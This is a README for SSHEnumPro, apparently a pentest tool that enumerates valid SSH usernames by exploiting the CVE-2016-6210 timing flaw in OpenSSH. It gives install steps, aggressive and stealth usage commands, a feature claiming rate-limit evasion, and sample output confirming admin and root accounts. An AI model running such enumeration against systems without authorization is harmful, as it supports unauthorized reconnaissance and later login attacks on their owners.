# 🚀 SSHEnumPro - Advanced SSH User Enumeration Tool

[![GitHub stars](https://img.shields.io/github/stars/KIRAN-KUMAR-K3/config?style=social)](https://github.com/KIRAN-KUMAR-K3/config)
[![GitHub forks](https://img.shields.io/github/forks/KIRAN-KUMAR-K3/config?style=social)](https://github.com/KIRAN-KUMAR-K3/config)
[![License](https://img.shields.io/github/license/KIRAN-KUMAR-K3/config)](https://github.com/KIRAN-KUMAR-K3/config/blob/main/LICENSE)
[![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://www.python.org/)

**Professional SSH User Enumeration exploiting CVE-2016-6210 timing attacks**  
*Developed by [Kiran Kumar K](https://github.com/KIRAN-KUMAR-K3)*

---

## ✨ **Features**

| Feature | Status |
|---------|--------|
| ✅ **CVE-2016-6210 Timing Attack** | High-precision user validation |
| ✅ **Multi-threading** | 8x faster enumeration |
| ✅ **Statistical Analysis** | Confidence scores (95%+ accuracy) |
| ✅ **Professional Reports** | JSON/CSV export for VAPT |
| ✅ **Python 3.12+ Compatible** | `time.perf_counter()` |
| ✅ **Rate Limiting Evasion** | Stealth scanning |
| ✅ **Color-coded Output** | Real-time results |
| ✅ **Cross-platform** | Linux/Windows/macOS |

---

## 🎯 **Real-world Success**
```
[+] VALID USER: admin (τ=0.0452s | 98.7%)
[+] VALID USER: root (τ=0.0521s | 95.3%)
✅ Valid Users Found: 2
📁 Reports: ssh_enum_192.168.1.100_22.json
```

---

## 🚀 **Quick Start**

### **Installation**
```
git clone https://github.com/KIRAN-KUMAR-K3/config.git
cd config/SSHEnumPro
pip3 install -r requirements.txt
chmod +x SSHEnumPro.py
```

### **Usage Examples**

```
# Single user test
python3 SSHEnumPro.py 192.168.1.100:22 -u admin

# User list (common users)
python3 SSHEnumPro.py target.com:2222 -U /usr/share/wordlists/dirb/common.txt

# Aggressive mode
python3 SSHEnumPro.py 10.0.0.1:22 -U users.txt -t 16 -f 3.0 -T 5

# Stealth mode
python3 SSHEnumPro.py target.com:2222 -u admin -q
```

---

## 📋 **Command Line Options**

```
python3 SSHEnumPro.py <host:port> [OPTIONS]

  -u, --user USER         Single username to test
  -U, --userlist FILE     Username list file
  -t, --threads N         Threads (default: 8)
  -b, --bytes N           Password bytes (default: 50000)
  -s, --samples N         Baseline samples (default: 20)
  -f, --factor F          Timing factor (default: 2.5)
  -T, --trials N          Trials per user (default: 3)
  -q, --quiet             Quiet mode (users only)
```

---

## 🛡️ **How It Works**

1. **Baseline Timing**: Measures non-existent user auth time (μ + 2.5σ)
2. **User Testing**: Compares real users against baseline
3. **Statistical Validation**: Multiple trials + confidence scoring
4. **Threaded Execution**: Parallel testing for speed
5. **Professional Reporting**: JSON/CSV for pentest reports

**CVE-2016-6210** exploits OpenSSH timing differences between valid/invalid users.

---

## 📊 **Sample Output**

```
🚀 SSH USER ENUMERATION PRO (CVE-2016-6210) 🚀
👨‍💻 Author: Kiran Kumar K | 💻 https://github.com/KIRAN-KUMAR-K3
🛡️ Target: 192.168.1.100:22 | 📅 2025-12-31 12:25:00

[*] SSH Banner: SSH-2.0-OpenSSH_8.7
[*] Baseline: μ=0.0021s σ=0.0004s Threshold: 0.0033s ✓

[+] VALID USER: admin (τ=0.0452s | 98.7%)
[+] VALID USER: root (τ=0.0521s | 95.3%)
[-] guest (τ=0.0018s | 12.3%)

📊 REPORT SUMMARY
✅ Valid Users Found: 2
📁 Reports: ssh_enum_192.168.1.100_22.[json|csv]
✨ Scan Complete!
```

---

## 📈 **VAPT Report Integration**

```
[
  {
    "user": "admin",
    "mean_timing": 0.0452,
    "confidence": 98.7,
    "status": "VALID",
    "timestamp": "2025-12-31T12:25:00"
  }
]
```

**Risk Rating**: **CRITICAL** - Valid usernames confirmed via timing attack

---

## 🐳 **Docker Support**

```
docker build -t sshenumpro .
docker run -it sshenumpro 192.168.1.100:22 -u admin
```

---

## 🔒 **Requirements**

```
paramiko>=3.0.0
numpy>=1.24.0
```

---

## ⚖️ **License**

```
MIT License - Use responsibly for authorized pentesting only!
For educational & authorized security testing purposes.
```

---

## 👥 **Author**

**Kiran Kumar K**  
💻 [GitHub](https://github.com/KIRAN-KUMAR-K3) | 🐛 [Bugcrowd](https://bugcrowd.com/KIRAN-KUMAR-K) | 📧 kirankumar.k0000  
**Ethical Hacker | Cybersecurity Researcher**

---

**⭐ Star this repo if it helped your pentest!**  
**🐛 Found a bug? [Open an issue](https://github.com/KIRAN-KUMAR-K3/config/issues)**

![Pentest Success](https://img.shields.io/badge/Pentest-Tool-brightgreen)
```
